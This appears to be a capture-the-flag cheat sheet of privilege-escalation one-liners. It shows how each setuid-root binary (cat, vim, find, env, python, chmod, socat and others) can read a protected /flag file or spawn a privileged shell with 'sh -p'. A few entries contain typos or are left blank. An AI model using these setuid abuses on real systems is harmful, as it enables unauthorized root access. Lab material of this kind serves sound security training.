All commands whose suid bit is already set
-rwsr-xr-x 1 root root

__Lets u directly read the flag!
cat          cat /flag
more         more /flag
less         less /flag
tail         tail /flag
head         head /flag
sort         sort /flag

____Shows you that an over-privileged editor is a very powerful tool!
vim          vim /flag
emacs        emacs -nw /flag
nano         nano /flag

____Requires you to understand their output to derive the flag from it!
rev          rev /flag | rev
hd           hd /flag
od           od -c /flag
xxd          xxd /flag | xxd -r
base32       base32 /flag | base32 -d
base64       base64 /flag | base64 -d
split        split -l 1 /flag -> cat xaa

___Forces you to understand different archive formats!
gzip         gzip /flag -> gzip -dc /flag
bzip2        bizp2 /flag -> bzip2 -dc /flag.bz2
zip          zip /flag.zip /flag  -> cat /flag.zip
tar          tar -cf archive.tar /flag -> cat archive.tar
ar           ar -q archive /flag -> cat archive
cpio         echo /flag | cpio -o > archive.cpio -> cat archive.cpio
genisoimage  genisoimage -sort /flag

___Enables you to read flags by making them execute other commands!
env          env /bin/sh -p
find         find . -exec /bin/sh -p \;
make         make a file containing /bin/sh p
nice         nice /bin/sh -p
timeout      timeout 100 /bin/sh -p
stdbuff      stdbuf -o0 /bin/sh -p
setarch      setarch $(uname -m) /bin/sh -p
watch        watch -x /usr/bin/cat /flag
socat        socat - EXEC:'/bin/cat /flag'

___Requires some light programming to read the flag.!
whiptail     whiptail --textbox /flag 20 70
awk          awk '{ print }' /flag
sed          sed -n 'p' /flag
ed           ed /flag  after that-> ,p

___Lets you get the flag by doing tricks with permissions!
chown       chown $(whoami) /flag
chmod       chmod a+x /flag 
cp          cp /flag theflag
mv

___Lets you read the flag because they let you program anything!
perl        print do { local (@ARGV, $/) = "/flag"; <> };
python      python -c 'print(open("/flag").read())'
ruby        puts File.read("/flag")
bash        bash -p -c "cat /flag"

___Just straight up wasn't designed to let you read files!
date        date -f /flag
dmesg       dmesg -F /flag
wc          wc --files0-from=/flag
gcc         gcc @/flag
as          as @/flag
wget        
ssh-keygen









